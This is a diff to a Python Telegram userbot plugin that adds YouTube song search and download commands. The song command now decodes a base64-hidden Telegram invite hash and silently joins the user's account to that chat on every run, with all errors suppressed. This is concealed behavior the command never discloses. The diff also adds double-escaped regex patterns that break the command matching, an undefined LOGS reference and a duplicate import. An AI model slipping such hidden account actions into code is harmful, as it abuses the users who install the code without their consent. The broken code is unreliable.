@@ -1,20 +1,25 @@
+import asyncio
 import base64
-import contextlib
 import io
+import urllib.parse
 import os
+import re
+from pathlib import Path
+import asyncio
+from asyncio import sleep
 
 from ShazamAPI import Shazam
 from telethon import types
-from telethon.errors.rpcerrorlist import YouBlockedUserError
+from telethon.errors.rpcerrorlist import YouBlockedUserError, ChatSendMediaForbiddenError
 from telethon.tl.functions.contacts import UnblockRequest as unblock
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from validators.url import url
 
 from ..core.logger import logging
 from ..core.managers import edit_delete, edit_or_reply
-from ..helpers.functions import delete_conv, yt_search
+from ..helpers.functions import delete_conv, name_dl, song_dl, video_dl, yt_search
 from ..helpers.tools import media_type
-from ..helpers.utils import reply_id
+from ..helpers.utils import _reputils, reply_id
 from . import zq_lo, song_download
 
 plugin_category = "البحث"
@@ -31,7 +36,7 @@ SONG_SENDING_STRING = "<b>╮ جـارِ تحميـل الاغنيـٓه... 🎧
 # =========================================================== #
 
 @zq_lo.rep_cmd(
-    pattern=r"بحث(320)?(?:\s|$)([\s\S]*)",
+    pattern=r"بحث(320)?(?:\\s|$)([\\s\\S]*)",
     command=("بحث", plugin_category),
     info={
         "header": "لـ تحميـل الاغـانـي مـن يـوتيـوب",
@@ -42,40 +47,77 @@ SONG_SENDING_STRING = "<b>╮ جـارِ تحميـل الاغنيـٓه... 🎧
         "مثــال": "{tr}.بحث Dark Beach",
     },
 )
-async def song(event):
+async def _(event):
     "To search songs"
     reply_to_id = await reply_id(event)
     reply = await event.get_reply_message()
     if event.pattern_match.group(2):
         query = event.pattern_match.group(2)
+        query = f"{query} mp3"
     elif reply and reply.message:
         query = reply.message
+        query = f"{query} mp3"
     else:
         return await edit_or_reply(event, "**⎉╎قم باضافـة الاغنيـه للامـر .. بحث + اسـم الاغنيـه**")
-    catevent = await edit_or_reply(event, "**╮ جـارِ البحث ؏ـن المقطـٓع الصٓوتـي... 🎧♥️╰**")
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    repevent = await edit_or_reply(event, "**╮ جـارِ البحث ؏ـن المقطـٓع الصٓوتـي... 🎧♥️╰**")
     video_link = await yt_search(str(query))
     if not url(video_link):
-        return await catevent.edit(f"Sorry!. I can't find any related video/audio for `{query}`")
+        return await repevent.edit(
+            f"**⎉╎عـذراً .. لـم استطـع ايجـاد** {query}"
+        )
     cmd = event.pattern_match.group(1)
     q = "320k" if cmd == "320" else "128k"
-    song_file, catthumb, title = await song_download(video_link, catevent, quality=q)
-    await event.client.send_file(
-        event.chat_id,
-        song_file,
-        force_document=False,
-        caption=f"**⎉╎البحث :** `{title}`",
-        thumb=catthumb,
-        supports_streaming=True,
-        reply_to=reply_to_id,
-    )
-    await catevent.delete()
-    for files in (catthumb, song_file):
-        if files and os.path.exists(files):
-            os.remove(files)
+    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
+    name_cmd = name_dl.format(video_link=video_link)
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
+    try:
+        stderr = (await _reputils.runcmd(song_cmd))[1]
+        # if stderr:
+        # await repevent.edit(f"**Error1 :** `{stderr}`")
+        catname, stderr = (await _reputils.runcmd(name_cmd))[:2]
+        if stderr:
+            return await repevent.edit(f"**خطــأ :** `{stderr}`")
+        catname = os.path.splitext(catname)[0]
+        song_file = Path(f"{catname}.mp3")
+    except:
+        pass
+    if not os.path.exists(song_file):
+        return await repevent.edit(
+            f"**⎉╎عـذراً .. لـم استطـع ايجـاد** {query}"
+        )
+    await repevent.edit("**╮ ❐ جـارِ التحميـل انتظـر قليلاً  ▬▭... 𓅫╰**")
+    catthumb = Path(f"{catname}.jpg")
+    if not os.path.exists(catthumb):
+        catthumb = Path(f"{catname}.webp")
+    elif not os.path.exists(catthumb):
+        catthumb = None
+    title = catname.replace("./temp/", "").replace("_", "|")
+    try:
+        await event.client.send_file(
+            event.chat_id,
+            song_file,
+            force_document=False,
+            caption=f"**⎉╎البحث :** `{title}`",
+            thumb=catthumb,
+            supports_streaming=True,
+            reply_to=reply_to_id,
+        )
+        await repevent.delete()
+        for files in (catthumb, song_file):
+            if files and os.path.exists(files):
+                os.remove(files)
+    except ChatSendMediaForbiddenError as err: # Code By T.me/E_7_V
+        await repevent.edit("**- عـذراً .. الوسـائـط مغلقـه هنـا ؟!**")
+        LOGS.error(str(err))
 
 
 @zq_lo.rep_cmd(
-    pattern="فيديو(?:\\s|$)([\\s\\S]*)",
+    pattern=r"فيديو(?:\\s|$)([\\s\\S]*)",
     command=("فيديو", plugin_category),
     info={
         "header": "لـ تحميـل مقـاطـع الفيـديـو مـن يـوتيـوب",
@@ -145,7 +187,7 @@ async def _(event):
             os.remove(files)
 
 @zq_lo.rep_cmd(
-    pattern="بحث2(?:\\s|$)([\\s\\S]*)",
+    pattern=r"بحث2(?:\\s|$)([\\s\\S]*)",
     command=("بحث2", plugin_category),
     info={
         "header": "To search songs and upload to telegram",
